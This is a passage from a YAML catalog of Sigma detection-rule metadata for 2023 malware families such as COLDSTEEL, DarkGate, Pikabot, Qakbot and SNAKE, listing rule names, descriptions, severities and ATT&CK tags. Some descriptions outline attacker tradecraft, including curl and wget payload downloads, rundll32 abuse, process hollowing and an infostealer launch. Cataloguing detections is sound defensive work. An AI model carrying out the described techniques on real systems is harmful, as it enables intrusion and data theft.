  - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/cold-steel/NCSC-MAR-Cold-Steel.pdf
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1fea93a2-1524-4a3c-9828-3aa0c2414e27
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/COLDSTEEL/file_event_win_malware_coldsteel_service_dll_creation.yml
  name: Potential COLDSTEEL Persistence Service DLL Creation
  description: Detects the creation of a file in a specific location and with a specific
    name related to COLDSTEEL RAT
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - attack.defense-evasion
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/cold-steel/NCSC-MAR-Cold-Steel.pdf
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1d7a57da-02e0-4f7f-92b1-c7b486ccfed5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/COLDSTEEL/image_load_malware_coldsteel_persistence_service_dll.yml
  name: Potential COLDSTEEL Persistence Service DLL Load
  description: 'Detects a suspicious DLL load by an "svchost" process based on location
    and name that might be related to ColdSteel RAT. This DLL location and name has
    been seen used by ColdSteel as the service DLL for its persistence mechanism

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - attack.defense-evasion
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/cold-steel/NCSC-MAR-Cold-Steel.pdf
  false_positives:
  - Unlikely
  notes: ''
- detection_id: e01b6eb5-1eb4-4465-a165-85d40d874add
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/COLDSTEEL/proc_creation_win_malware_coldsteel_anonymous_process.yml
  name: COLDSTEEL RAT Anonymous User Process Execution
  description: Detects the creation of a process executing as user called "ANONYMOUS"
    seen used by the "MileStone2016" variant of COLDSTEEL
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - attack.defense-evasion
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/cold-steel/NCSC-MAR-Cold-Steel.pdf
  false_positives:
  - Unknown
  notes: ''
- detection_id: 88516f06-ebe0-47ad-858e-ae9fd060ddea
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/COLDSTEEL/proc_creation_win_malware_coldsteel_cleanup.yml
  name: COLDSTEEL RAT Cleanup Command Execution
  description: Detects the creation of a "rundll32" process from the ColdSteel persistence
    service to initiate the cleanup command by calling one of its own exports. This
    functionality is not present in "MileStone2017" and some "MileStone2016" samples
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - attack.defense-evasion
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/cold-steel/NCSC-MAR-Cold-Steel.pdf
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 9f9cd389-cea0-4142-bf1a-a3fd424abedd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/COLDSTEEL/proc_creation_win_malware_coldsteel_service_persistence.yml
  name: COLDSTEEL RAT Service Persistence Execution
  description: Detects the creation of an "svchost" process with specific command
    line flags, that were seen present and used by ColdSteel RAT
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - attack.defense-evasion
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/cold-steel/NCSC-MAR-Cold-Steel.pdf
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 95214813-4c7a-4a50-921b-ee5c538e1d16
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/COLDSTEEL/registry_set_malware_coldsteel_created_users.yml
  name: Potential COLDSTEEL RAT Windows User Creation
  description: Detects creation of a new user profile with a specific username, seen
    being used by some variants of the COLDSTEEL RAT.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/cold-steel/NCSC-MAR-Cold-Steel.pdf
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3ced239c-7285-4b54-99c4-8525b69293f7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/COLDSTEEL/win_system_malware_coldsteel_persistence_service.yml
  name: COLDSTEEL Persistence Service Creation
  description: Detects the creation of new services potentially related to COLDSTEEL
    RAT
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.persistence
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/cold-steel/NCSC-MAR-Cold-Steel.pdf
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 1a433e1d-03d2-47a6-8063-ece992cf4e73
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/DarkGate/file_event_win_malware_darkgate_autoit3_binary_creation.yml
  name: DarkGate - Autoit3.EXE File Creation By Uncommon Process
  description: 'Detects the usage of curl.exe, KeyScramblerLogon, or other non-standard/suspicious
    processes used to create Autoit3.exe.

    This activity has been associated with DarkGate malware, which uses Autoit3.exe
    to execute shellcode that performs

    process injection and connects to the DarkGate command-and-control server. Curl,
    KeyScramblerLogon, and these other

    processes consitute non-standard and suspicious ways to retrieve the Autoit3 executable.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  - T1105
  tags:
  - attack.command-and-control
  - attack.execution
  - attack.t1105
  - attack.t1059
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.security.telekom.com/2023/08/darkgate-loader.html
  - https://www.kroll.com/en/insights/publications/cyber/microsoft-teams-used-as-initial-access-for-darkgate-malware
  - https://github.com/pr0xylife/DarkGate/tree/main
  false_positives:
  - Unknown
  notes: ''
- detection_id: f8e9aa1c-14f2-4dbd-aa59-b98968ed650d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/DarkGate/proc_creation_win_malware_darkgate_autoit3_from_susp_parent_and_location.yml
  name: DarkGate - Autoit3.EXE Execution Parameters
  description: 'Detects execution of the legitimate Autoit3 utility from a suspicious
    parent process. AutoIt3.exe is used within

    the DarkGate infection chain to execute shellcode that performs process injection
    and connects to the DarkGate

    command-and-control server.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.security.telekom.com/2023/08/darkgate-loader.html
  - https://www.kroll.com/en/insights/publications/cyber/microsoft-teams-used-as-initial-access-for-darkgate-malware
  - https://github.com/pr0xylife/DarkGate/tree/main
  false_positives:
  - Unlikely
  notes: ''
- detection_id: bf906d7b-7070-4642-8383-e404cf26eba5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/DarkGate/proc_creation_win_malware_darkgate_net_user_creation.yml
  name: DarkGate - User Created Via Net.EXE
  description: Detects creation of local users via the net.exe command with the name
    of "DarkGate"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1136.001
  tags:
  - attack.persistence
  - attack.t1136.001
  - detection.emerging-threats
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unlikely
  notes: ''
- detection_id: bcc6f179-11cd-4111-a9a6-0fab68515cf7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/Griffon/proc_creation_win_malware_griffon_patterns.yml
  name: Griffon Malware Attack Pattern
  description: Detects process execution patterns related to Griffon malware as reported
    by Kaspersky
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 89e1490f-1a3e-452a-bbb8-b68a5f58072f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/GuLoader/proc_creation_win_malware_guloader_execution.yml
  name: Injected Browser Process Spawning Rundll32 - GuLoader Activity
  description: 'Detects the execution of installed GuLoader malware on the host.

    GuLoader is initiating network connections via the rundll32.exe process that is
    spawned via a browser parent(injected) process.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1055
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1055
  - detection.emerging-threats
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 2bd8e100-5b3b-4b6a-bbb5-b129d3ddddc5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/IcedID/proc_creation_win_malware_icedid_rundll32_dllregisterserver.yml
  name: IcedID Malware Suspicious Single Digit DLL Execution Via Rundll32
  description: Detects RunDLL32.exe executing a single digit DLL named "1.dll" with
    the export function "DllRegisterServer". This behaviour was often seen used by
    malware and especially IcedID
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.t1218.011
  - detection.emerging-threats
  time_window: ''
  references:
  - https://thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/
  - https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/
  false_positives:
  - Unknown
  notes: ''
- detection_id: cae6cee6-0244-44d2-84ed-e65f548eb7dc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/Pikabot/net_connection_win_malware_pikabot_rundll32_activity.yml
  name: Potential Pikabot C2 Activity
  description: 'Detects the execution of rundll32 that leads to an external network
    connection.

    The malware Pikabot has been seen to use this technique to initiate C2-communication
    through hard-coded Windows binaries.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques:
  - T1573
  tags:
  - attack.command-and-control
  - attack.t1573
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.virustotal.com/gui/file/d72af640b71b8e3eca3eba660dd7c7f029ff8852bcacaa379e7b6c57cf4d9b44
  - https://www.virustotal.com/gui/file/6bb4cdbaef03b732a93559a58173e7f16b29bfb159a1065fae9185000ff23b4b
  - https://github.com/pr0xylife/Pikabot/blob/7f7723a74ca325ec54c6e61e076acce9a4b20538/Pikabot_06.12.2023.txt
  false_positives:
  - Unlikely
  notes: ''
- detection_id: e5144106-8198-4f6e-bfc2-0a551cc8dd94
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/Pikabot/proc_creation_win_malware_pikabot_combined_commands_execution.yml
  name: Potential Pikabot Infection - Suspicious Command Combinations Via Cmd.EXE
  description: 'Detects the execution of concatenated commands via "cmd.exe". Pikabot
    often executes a combination of multiple commands via the command handler "cmd
    /c" in order to download and execute additional payloads.

    Commands such as "curl", "wget" in order to download extra payloads. "ping" and
    "timeout" are abused to introduce delays in the command execution and "Rundll32"
    is also used to execute malicious DLL files.

    In the observed Pikabot infections, a combination of the commands described above
    are used to orchestrate the download and execution of malicious DLL files.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.003
  - T1105
  - T1218
  tags:
  - attack.defense-evasion
  - attack.command-and-control
  - attack.execution
  - attack.t1059.003
  - attack.t1105
  - attack.t1218
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/pr0xylife/Pikabot/blob/7f7723a74ca325ec54c6e61e076acce9a4b20538/Pikabot_30.10.2023.txt
  - https://github.com/pr0xylife/Pikabot/blob/7f7723a74ca325ec54c6e61e076acce9a4b20538/Pikabot_22.12.2023.txt
  false_positives:
  - Unknown
  notes: ''
- detection_id: 698d4431-514f-4c82-af4d-cf573872a9f5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/Pikabot/proc_creation_win_malware_pikabot_discovery.yml
  name: Potential Pikabot Discovery Activity
  description: 'Detects system discovery activity carried out by Pikabot, such as
    incl. network, user info and domain groups.

    The malware Pikabot has been seen to use this technique as part of its C2-botnet
    registration with a short collection time frame (less than 1 minute).

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1016
  - T1049
  - T1087
  tags:
  - attack.discovery
  - attack.t1016
  - attack.t1049
  - attack.t1087
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.virustotal.com/gui/file/72f1a5476a845ea02344c9b7edecfe399f64b52409229edaf856fcb9535e3242
  - https://tria.ge/231023-lpw85she57/behavioral2
  false_positives:
  - Unlikely
  notes: ''
- detection_id: d8937fe7-42d5-4b4d-8178-e089c908f63f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/Pikabot/proc_creation_win_malware_pikabot_rundll32_hollowing.yml
  name: Potential Pikabot Hollowing Activity
  description: 'Detects the execution of rundll32 that leads to the invocation of
    legitimate Windows binaries.

    The malware Pikabot has been seen to use this technique for process hollowing
    through hard-coded Windows binaries

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1055.012
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1055.012
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.virustotal.com/gui/file/b6e8910fb9b3bb1fcddefd35ff0ed8624930d30d6977e11808c8330415685a62
  - https://www.virustotal.com/gui/file/6bb4cdbaef03b732a93559a58173e7f16b29bfb159a1065fae9185000ff23b4b
  - https://github.com/pr0xylife/Pikabot/blob/7f7723a74ca325ec54c6e61e076acce9a4b20538/Pikabot_06.12.2023.txt
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 1bf0ba65-9a39-42a2-9271-31d31bf2f0bf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/Pikabot/proc_creation_win_malware_pikabot_rundll32_uncommon_extension.yml
  name: Pikabot Fake DLL Extension Execution Via Rundll32.EXE
  description: 'Detects specific process tree behavior linked to "rundll32" executions,
    wherein the associated DLL lacks a common ".dll" extension, often signaling potential
    Pikabot activity.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/pr0xylife/Pikabot
  - https://tria.ge/231004-tp8k6sch9t/behavioral2
  - https://www.virustotal.com/gui/file/56db0c4842a63234ab7fe2dda6eeb63aa7bb68f9a456985b519122f74dea37e2/behavior
  - https://tria.ge/231212-r1bpgaefar/behavioral2
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0033cf83-fb87-446d-9cac-43d63ad4d5a9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/Qakbot/proc_creation_win_malware_qakbot_regsvr32_calc_pattern.yml
  name: Qakbot Regsvr32 Calc Pattern
  description: Detects a specific command line of "regsvr32" where the "calc" keyword
    is used in conjunction with the "/s" flag. This behavior is often seen used by
    Qakbot
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/pr0xylife/Qakbot/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: cf879ffb-793a-4753-9a14-bc8f37cc90df
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/Qakbot/proc_creation_win_malware_qakbot_rundll32_execution.yml
  name: Potential Qakbot Rundll32 Execution
  description: Detects specific process tree behavior of a "rundll32" execution often
    linked with potential Qakbot activity.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/pr0xylife/Qakbot/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 339ed3d6-5490-46d0-96a7-8abe33078f58
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/Qakbot/proc_creation_win_malware_qakbot_rundll32_exports.yml
  name: Qakbot Rundll32 Exports Execution
  description: Detects specific process tree behavior of a "rundll32" execution with
    exports linked with Qakbot activity.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/pr0xylife/Qakbot/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: bfd34392-c591-4009-b938-9fd985a28b85
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/Qakbot/proc_creation_win_malware_qakbot_rundll32_fake_dll_execution.yml
  name: Qakbot Rundll32 Fake DLL Extension Execution
  description: Detects specific process tree behavior of a "rundll32" execution where
    the DLL doesn't have the ".dll" extension. This is often linked with potential
    Qakbot activity.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/pr0xylife/Qakbot/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: bc309b7a-3c29-4937-a4a3-e232473f9168
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/Qakbot/proc_creation_win_malware_qakbot_uninstaller_cleanup.yml
  name: Qakbot Uninstaller Execution
  description: Detects the execution of the Qakbot uninstaller file mentioned in the
    USAO-CDCA document on the disruption of the Qakbot malware and botnet
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.justice.gov/usao-cdca/divisions/national-security-division/qakbot-resources
  - https://www.virustotal.com/gui/file/7cdee5a583eacf24b1f142413aabb4e556ccf4ef3a4764ad084c1526cc90e117/community
  - https://www.virustotal.com/gui/file/fab408536aa37c4abc8be97ab9c1f86cb33b63923d423fdc2859eb9d63fa8ea0/community
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 5cdbc2e8-86dd-43df-9a1a-200d4745fba5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/Rhadamanthys/proc_creation_win_malware_rhadamanthys_stealer_dll_launch.yml
  name: Rhadamanthys Stealer Module Launch Via Rundll32.EXE
  description: Detects the use of Rundll32 to launch an NSIS module that serves as
    the main stealer capability of Rhadamanthys infostealer, as observed in reports
    and samples in early 2023
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.t1218.011
  - detection.emerging-threats
  time_window: ''
  references:
  - https://elis531989.medium.com/dancing-with-shellcodes-analyzing-rhadamanthys-stealer-3c4986966a88
  - https://blog.cyble.com/2023/01/12/rhadamanthys-new-stealer-spreading-through-google-ads/
  - https://www.joesandbox.com/analysis/790122/0/html
  - https://twitter.com/anfam17/status/1607477672057208835
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0e9e6c63-1350-48c4-9fa1-7ccb235edc68
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/Rorschach/proc_creation_win_malware_rorschach_ransomware_activity.yml
  name: Rorschach Ransomware Execution Activity
  description: Detects Rorschach ransomware execution activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1059.003
  tags:
  - attack.execution
  - attack.t1059.003
  - attack.t1059.001
  - attack.defense-evasion
  - detection.emerging-threats
  time_window: ''
  references:
  - https://research.checkpoint.com/2023/rorschach-a-new-sophisticated-and-fast-ransomware/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: d6d9d23f-69c1-41b5-8305-fa8250bd027f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/SNAKE/file_event_win_malware_snake_encrypted_payload_ioc.yml
  name: SNAKE Malware Kernel Driver File Indicator
  description: Detects SNAKE malware kernel driver file indicator
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 99eccc2b-7182-442f-8806-b76cc36d866b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/SNAKE/file_event_win_malware_snake_installers_ioc.yml
  name: SNAKE Malware Installer Name Indicators
  description: Detects filename indicators associated with the SNAKE malware as reported
    by CISA in their report
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF
  false_positives:
  - Some legitimate software was also seen using these names. Apply additional filters
    and use this rule as a hunting basis.
  notes: ''
- detection_id: 64827580-e4c3-4c64-97eb-c72325d45399
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/SNAKE/file_event_win_malware_snake_werfault_creation.yml
  name: SNAKE Malware WerFault Persistence File Creation
  description: Detects the creation of a file named "WerFault.exe" in the WinSxS directory
    by a non-system process, which can be indicative of potential SNAKE malware activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF
  false_positives:
  - Unknown
  notes: ''
- detection_id: 02cbc035-b390-49fe-a9ff-3bb402c826db
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/SNAKE/proc_creation_win_malware_snake_installer_cli_args.yml
  name: Potential SNAKE Malware Installation CLI Arguments Indicator
  description: Detects a specific command line arguments sequence seen used by SNAKE
    malware during its installation as described by CISA in their report
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF
  false_positives:
  - Unlikely
  notes: ''
- detection_id: d91ff53f-fd0c-419d-a6b8-ae038d5c3733
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/SNAKE/proc_creation_win_malware_snake_installer_exec.yml
  name: Potential SNAKE Malware Installation Binary Indicator
  description: Detects a specific binary name seen used by SNAKE malware during its
    installation as described by CISA in their report
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF
  false_positives:
  - Unlikely
  notes: ''
- detection_id: f7536642-4a08-4dd9-b6d5-c3286d8975ed
  source_id: sigmahq_sigma
